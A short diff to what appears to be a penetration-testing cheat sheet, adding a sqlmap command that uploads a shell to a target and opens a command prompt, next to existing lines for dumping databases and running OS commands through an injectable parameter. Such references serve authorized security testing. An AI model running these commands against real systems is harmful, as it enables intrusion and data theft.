@@ -1299,6 +1299,9 @@ python /path/to/sqlmap -r req.txt -p param_to_attack --dump
 
 # execute command
 python /path/to/sqlmap -r req.txt -p param_to_attack --os-cmd=command_here
+
+# upload shell to target + get command prompt
+python /path/to/sqlmap -r req.txt -p param_to_attack --os-shell
 ```
 
 
